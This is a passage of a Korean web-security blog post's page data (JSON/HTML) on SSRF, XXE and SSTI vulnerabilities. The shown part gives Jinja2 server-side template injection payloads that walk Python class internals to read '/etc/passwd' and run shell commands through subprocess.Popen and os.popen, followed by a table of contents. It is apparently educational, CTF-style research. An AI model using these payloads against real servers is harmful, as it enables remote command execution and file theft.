punctuation\">.</span>__subclass__<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span>n<span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">'/etc/passwd/'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">}</span></code></pre></div>\n<p><strong>SSTI MRO File Read/Exec</strong></p>\n<ul>\n<li><code class=\"language-text\">subprocess.Popen</code> 객체를 활용하여 서버내 파일을 읽어와 출력하는 형태로 진행할 수 있습니다.</li>\n<li>subprocess 모듈을 사용하여 하부 프로세스 생성과 관리를 하는 <code class=\"language-text\">popen</code> 클래스를 사용합니다.</li>\n<li>새로운 프로세스에서 자식 프로그램을 실행하고 POSIX에서 클래스는 자식 프로그램을 실행하는데 <code class=\"language-text\">os.execvp()</code> 와 동일하게 동작하며 <code class=\"language-text\">Shell=True</code> 셸의 기본 값이 /bin/sh로 지정되어 명령을 수행할 수 있습니다.</li>\n<li>timeout시 프로세스가 종료되지 않도록 하기 위해 <code class=\"language-text\">communicate</code> 메서드를 활용합시다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\"><span class=\"token punctuation\">{</span><span class=\"token punctuation\">{</span><span class=\"token string\">''</span><span class=\"token punctuation\">.</span>__class__<span class=\"token punctuation\">.</span>__mro__<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>__subclasses__<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span>n<span class=\"token punctuation\">]</span><span class=\"token punctuation\">(</span><span class=\"token string\">'cat flag'</span><span class=\"token punctuation\">,</span> shell<span class=\"token operator\">=</span><span class=\"token boolean\">True</span><span class=\"token punctuation\">,</span> stdout<span class=\"token operator\">=</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>communicate<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">}</span>\n\n<span class=\"token punctuation\">{</span><span class=\"token punctuation\">{</span>config<span class=\"token punctuation\">.</span>__class__<span class=\"token punctuation\">.</span>__init__<span class=\"token punctuation\">.</span>__globals__<span class=\"token punctuation\">[</span><span class=\"token string\">'os'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>popen<span class=\"token punctuation\">(</span><span class=\"token string\">'flag'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">}</span>\n\n<span class=\"token punctuation\">{</span><span class=\"token punctuation\">{</span><span class=\"token string\">''</span><span class=\"token punctuation\">.</span>__class__<span class=\"token punctuation\">.</span>__mro__<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>__subclasses__<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span>n<span class=\"token punctuation\">]</span><span class=\"token punctuation\">(</span><span class=\"token string\">'flag'</span><span class=\"token punctuation\">,</span> shell<span class=\"token operator\">=</span><span class=\"token boolean\">True</span><span class=\"token punctuation\">,</span> stdout<span class=\"token operator\">=</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>communicate<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">}</span></code></pre></div>\n<div class=\"table-of-contents\">\n<ul>\n<li>\n<p><a href=\"#php-ssrf-example\">PHP SSRF Example</a></p>\n</li>\n<li>\n<p><a href=\"#ssrf-%EA%B3%B5%EA%B2%A9%EC%8B%9C-%EC%82%AC%EC%9A%A9-%EA%B0%80%EB%8A%A5%ED%95%9C-protocol-%EC%A2%85%EB%A5%98\">SSRF 공격시 사용 가능한 Protocol 종류</a></p>\n<ul>\n<li><a href=\"#php-wrapper-only-php\">PHP Wrapper (Only PHP)</a></li>\n<li><a href=\"#gopher-protocol%EC%9D%84-%ED%99%9C%EC%9A%A9%ED%95%9C-http-%ED%8C%A8%ED%82%B7-%EC%A0%84%EC%86%A1\">Gopher Protocol을 활용한 HTTP 패킷 전송</a></li>\n<li><a href=\"#gopher-%ED%94%84%EB%A1%9C%ED%86%A0%EC%BD%9C-%ED%99%9C%EC%9A%A9-%EB%8D%B0%EC%9D%B4%ED%84%B0%EB%B2%A0%EC%9D%B4%EC%8A%A4-%EC%A0%91%EA%B7%BC\">Gopher 프로토콜 활용 데이터베이스 접근</a></li>\n<li><a href=\"#%EA%B7%B8%EB%A0%87%EB%8B%A4%EB%A9%B4-xxe%EB%A5%BC-%ED%99%9C%EC%9A%A9%ED%95%98%EC%97%AC-%EB%AC%B4%EC%97%87%EC%9D%84-%ED%95%A0-%EC%88%98-%EC%9E%88%EA%B9%8C%EC%9A%94\">그렇다면 XXE를 활용하여 무엇을 할 수 있까요?</a></li>\n<li><a href=\"#xxe-%ED%8C%8C%EC%9D%BC-%EC%9D%BD%EA%B8%B0\">XXE 파일 읽기</a></li>\n<li><a href=\"#bind-xxe-attack\">Bind XXE Attack</a></li>\n<li><a href=\"#server-side-template-injection-example\">Server Side Template Injection Example</a></li>\n<li><a href=\"#ssti-sandbox-escape\">SSTI Sandbox Escape</a></li>\n</ul>\n</li>\n</ul>\n</div>","frontmatter":{"date":"December 26, 2021","title":"Web Application SSRF/XXE/SSTI 취약점 연구","categories":"Web","author":"Zer0Luck","emoji":"🥶"},"fields":{"slug":"/we_application_SSRF/"}},"site":{"siteMetadata":{"siteUrl":"https://dnsdudrla97.github.io","comments":{"utterances":{"repo":"dnsdudrla97/dnsdudrla97.github.io"}}}}},"pageContext":{"slug":"/web_application_rce1/","nextSlug":"/hackingzone_event/","prevSlug":"/we_application_SSRF/"}},
    "staticQueryHashes": ["1073350324","1956554647","2938748437"]}